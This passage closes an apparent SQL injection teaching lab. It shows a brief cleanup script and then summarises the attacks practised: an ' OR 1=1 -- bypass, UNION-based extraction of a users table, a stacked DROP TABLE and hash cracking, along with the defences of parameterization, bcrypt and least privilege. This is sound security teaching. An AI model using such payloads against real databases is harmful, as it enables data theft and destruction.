for f in [".env"]:
    if os.path.exists(f):
        os.remove(f)

print("lab cleanup complete")
```

---

## Summary

You performed, in sequence:

1. **Filter bypass** with `' OR 1=1 --`
2. **Column discovery** via `ORDER BY N` error messages
3. **Type probing** with `UNION SELECT NULL, NULL, NULL` to confirm the `(int, text, text)` window
4. **Exfiltration** of the `users` table through the `products` search slot
5. **Destruction** via stacked `DROP TABLE`
6. **Cracking** the stolen hashes with a dictionary attack; then watched salt and bcrypt defeat the same attack
7. **Second-order injection** — malicious data stored safely, exploited later by a non-parameterized UPDATE
8. **Credential hygiene** with `.env`, `.gitignore`, and the case for least-privileged DB users

The red thread through every attack: **user input was treated as SQL grammar, not as data.** The red thread through every defense: **parameterize the query (first), and assume prevention will fail someday (hashing, least privilege, logging).**

**Next:** Read [w11_l22_concept_data_security.md](w11_l22_concept_data_security.md) to formalize what you saw — the parser/binder mental model, the "restriction window," the OWASP Top 10, and why sanitization is not a substitute for parameterization. The concept file is the debrief; the lab was the experiment.
